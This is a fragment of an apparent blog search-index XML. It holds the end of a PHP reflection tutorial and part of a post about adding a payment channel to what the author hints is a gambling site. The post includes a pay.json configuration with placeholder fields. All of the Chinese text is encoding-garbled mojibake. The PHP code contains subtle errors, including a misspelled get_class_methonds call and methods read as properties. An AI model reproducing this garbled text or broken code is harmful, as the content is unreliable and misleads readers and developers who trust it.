class="comment">//ç±»å±æ€§</span></span><br><span class="line">var_dump(get_class_vars(get_class(<span class="variable">$student</span>)));</span><br><span class="line"><span class="comment">//è¿”å›ç”±ç±»çš„æ–¹æ³•ç»„æˆçš„æ•°ç»„</span></span><br><span class="line">var_dump(get_class_methonds(get_class(<span class="variable">$student</span>)));</span><br></pre></td></tr></table></figure><h3 id="è·å–å¯¹è±¡å±äºå“ªä¸ªç±»"><a href="#è·å–å¯¹è±¡å±äºå“ªä¸ªç±»" class="headerlink" title="è·å–å¯¹è±¡å±äºå“ªä¸ªç±»"></a>è·å–å¯¹è±¡å±äºå“ªä¸ªç±»</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> get_class(<span class="variable">$student</span>);</span><br></pre></td></tr></table></figure><h3 id="è¿˜åŸç±»åŸå‹"><a href="#è¿˜åŸç±»åŸå‹" class="headerlink" title="è¿˜åŸç±»åŸå‹"></a>è¿˜åŸç±»åŸå‹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åå°„è·å–ç±»çš„åŸå‹</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;person&#x27;</span>);</span><br><span class="line"><span class="variable">$className</span> = <span class="variable">$obj</span>-&gt;getName();</span><br><span class="line"><span class="variable">$methods</span> = <span class="variable">$properties</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span>-&gt;getProperties() <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="variable">$properties</span>[<span class="variable">$v</span>-&gt;getName()] = <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span>-&gt;getMethods() <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span>[<span class="variable">$v</span>-&gt;getName()] = <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;class <span class="subst">&#123;$className&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">is_array(<span class="variable">$properties</span>) &amp;&amp; ksort(<span class="variable">$properties</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$v</span>-&gt;isPublic ? <span class="string">&#x27;public&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$v</span>-&gt;isPrivate ? <span class="string">&#x27;private&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$v</span>-&gt;isProtected ? <span class="string">&#x27;protected&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$v</span>-&gt;static ? <span class="string">&#x27;static&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$methods</span>)) ksort(<span class="variable">$methods</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;function<span class="subst">&#123;$k&#125;</span>()&#123;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PHPæ‰‹å†Œå…³äºåå°„APIæœ‰å‡ åä¸ªï¼Œåå°„å®Œæ•´çš„æè¿°äº†ä¸€ä¸ªç±»æˆ–å¯¹è±¡çš„åŸå‹ï¼Œåå°„ä¸ä»…å¯ä»¥ç”¨äºç±»å’Œå¯¹è±¡ï¼Œè¿˜å¯ä»¥ç”¨äºå‡½æ•°ï¼Œæ‰©å±•æ¨¡å—ï¼Œå¼‚å¸¸ç­‰</p><h3 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p>å–„ç”¨åå°„èƒ½ä¿æŒä»£ç çš„ä¼˜é›…å’Œç®€æ´ï¼Œä½†åå°„ä¹Ÿä¼šç ´åç±»çš„å°è£…æ€§ï¼Œå› ä¸ºåå°„å¯ä»¥ä½¿æœ¬ä¸è¯¥æš´éœ²çš„æ–¹æ³•æˆ–å±æ€§è¢«å¼ºåˆ¶æš´éœ²äº†å‡ºæ¥ï¼Œæ˜¯ä¼˜ç‚¹ä¹Ÿæ˜¯ç¼ºç‚¹</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¹è´­è èœæ·»åŠ æ”¯ä»˜æ–¹å¼</title>
      <link href="post/25578/"/>
      <url>post/25578/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>çªç„¶æœ‰ä¸€å¤©è€æ¿æ‰”ç»™æˆ‘ä¸€ä¸ªé”™è¯¯ç™¾å‡ºçš„æ–‡æ¡£ï¼ˆæ–‡æ¡£ä¸è§„èŒƒï¼Œç å†œä¸¤è¡Œæ³ªï¼‰ï¼Œè®©æˆ‘å¾€æŸä¸çŸ¥åç½‘ç«™æ·»åŠ æŸä¸å¯æè¿°æ”¯ä»˜</p><span id="more"></span><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li><p>ç™»å½•åå°å‘ç°æœ‰æ·»åŠ ç¬¬ä¸‰æ–¹æ”¯ä»˜çš„èœå•ï¼Œä½†æ˜¯å‘ç°åªèƒ½æ›´æ”¹é…ç½®ï¼Œæ— æ³•æ·»åŠ æ–°çš„æ”¯ä»˜æ–¹å¼ï¼ˆçŸ¥é“ä¸ä¼šè¿™ä¹ˆç®€å•ï¼‰</p></li><li><p>è¿›å…¥æ•°æ®åº“å‘ç°æ•°æ®å­˜å‚¨åœ¨<code>payment_config</code>è¡¨ä¸­ï¼Œè¯•ç€ç›´æ¥æ•°æ®åº“æ·»åŠ æŸ¥çœ‹æ•°æ®å˜åŒ–ï¼Œæ·»åŠ åå‘ç°åªèƒ½å‡ºç°åœ¨æ”¯ä»˜åˆ—è¡¨ä¸­ï¼Œæ— æ³•æ·»åŠ å’Œæ›´æ”¹é…ç½®</p></li><li><p>æŸ¥çœ‹é¡µé¢è¯·æ±‚ï¼Œç›´æ¥é˜…è¯»è·å–æ”¯ä»˜ä»£ç ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>pay.json</code>çš„é…ç½®æ–‡ä»¶ï¼Œç›´æ¥æ‰“å¼€ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹</p></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;nid&quot;</span>: <span class="string">&quot;nid_pay&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;è¯·é€‰æ‹©ç±»å‹&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantID&quot;</span>: <span class="string">&quot;æ”¯ä»˜å¹³å°æä¾›ç»™å•†å®¶çš„è´¦å·&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;terminalID&quot;</span>: <span class="string">&quot;æ”¯ä»˜å¹³å°æä¾›ç»™å•†å®¶çš„ç»ˆç«¯å·&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantKey&quot;</span>: <span class="string">&quot;æ”¯ä»˜å¹³å°æä¾›ä¸ªå•†å®¶çš„å¯†ç ï¼ˆMD5åŠ å¯†æ—¶ä½¿ç”¨ï¼‰&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantPayKey&quot;</span>: <span class="string">&quot;æ”¯ä»˜æœ‰å…³çš„å…¶ä»–ç§˜é’¥æˆ–ä¿¡æ¯&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;partnerId&quot;</span>: <span class="string">&quot;æ”¯ä»˜å¹³å°ä»£ç†å•†è´¦å·&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantPrivateKey&quot;</span>: <span class="string">&quot;ç”¨æˆ·ç§é’¥ï¼ˆä¸ç”¨æˆ·å…¬é’¥æˆå¯¹å­˜åœ¨ï¼‰&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantPublicKey&quot;</span>: <span class="string">&quot;ç”¨æˆ·å…¬é’¥ï¼ˆä¸ç”¨æˆ·ç§é’¥æˆå¯¹å­˜åœ¨ï¼‰&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;platformPublicKey&quot;</span>: <span class="string">&quot;å¹³å°å…¬é’¥ï¼ˆå¹³å°æä¾›ï¼Œä¸€èˆ¬åœ¨å•†æˆ·ç™»å½•æ”¯ä»˜å¹³å°åå°ç®¡ç†é¡µé¢è·å–ï¼‰&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantCertPath&quot;</span>: <span class="string">&quot;å•†å®¶è¯ä¹¦&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;platformCertPath&quot;</span>: <span class="string">&quot;å¹³å°è¯ä¹¦&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;payBank&quot;</span>: [&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;ICBC&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">2</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;ABC&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">9</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;BOC&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">7</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;CCB&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">10</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;COMM&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">11</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;CMB&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">14</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;SPDB&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">26</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;CIB&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">15</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;CMBC&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">13</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;GDB&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">12</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;SPDB&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">8</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;CEB&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">29</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;HXB&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">3</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;PSBC&quot;</span>&#125;,&#123;<span class="attr">&quot;bank_id&quot;</span>:<span class="number">6</span>,<span class="attr">&quot;code&quot;</span>:<span class="string">&quot;PAB&quot;</span>&#125;</span><br><span class="line">    ],</span><br><span class="line">        <span class="attr">&quot;pay_layers&quot;</span>: <span class="string">&quot;1,2,3,5,4,6,7,8,9,10,11&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;payType&quot;</span>: [</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">1</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;å¾®ä¿¡æ‰«ç æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;æ”¯ä»˜é…ç½®ä¿¡æ¯&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;å…¶ä»–æ”¯ä»˜é…ç½®ä¿¡æ¯&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;ç«¯å£ç±»å‹ï¼š1=ios,2=android,3=h5,4=pc&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="string">&quot;æ˜¯å¦å¯ç”¨ï¼š1:å¯ç”¨;2:ç¦ç”¨&quot;</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="string">&quot;è¿”å›æ•°æ®orè·³è½¬é¡µé¢ï¼š1ï¼šè¿”å›æ•°æ®ï¼Œ2:è·³è½¬é¡µé¢&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">2</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;å¾®ä¿¡WAPæ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;WX_WAP&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">3</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;å¾®ä¿¡H5æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;WX_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">4</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;æ”¯ä»˜å®æ‰«ç æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;ALI&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">5</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;æ”¯ä»˜å®WAPæ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;ALI_WAP&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">6</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;æ”¯ä»˜å®H5æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;ALI_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">7</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;QQé’±åŒ…æ‰«ç æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;QQ&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">8</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;QQé’±åŒ…WAPæ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;QQ_WAP&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">9</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;QQé’±åŒ…H5æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;QQ_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">10</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;ç½‘é“¶æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;WY&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">11</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;ç½‘é“¶H5æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;WY_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">12</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;ç½‘é“¶å¿«æ·æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;WY_KJ&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">13</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;äº¬ä¸œé’±åŒ…æ‰«ç æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;JD&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">14</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;äº¬ä¸œé’±åŒ…WAPæ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;JD_WAP&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">15</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;äº¬ä¸œé’±åŒ…H5æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;JD_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">16</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;é“¶è”é’±åŒ…æ‰«ç æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;UN&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">17</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;é“¶è”é’±åŒ…WAPæ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;UN_WAP&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">18</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;é“¶è”é’±åŒ…H5æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;UN_H5&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">          &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">19</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;ç½‘å…³æ”¯ä»˜æ‰«ç &quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;gateway&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;,</span><br><span class="line">          &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">20</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;å¾®ä¿¡å…¬ä¼—è´¦å·&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;weixinjsapi&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">21</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;æ”¯ä»˜å®æœåŠ¡çª—æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;weixinjsapi&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">22</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;æ”¯ä»˜å®appæ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;alipayapp&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">23</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;è‹å®æ‰«ç æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;suning&quot;</span>,<span class="attr">&quot;typeStr&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;sort&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;nid&quot;</span>: <span class="string">&quot;hua_yin_pay&quot;</span>,</span><br><span class="line">     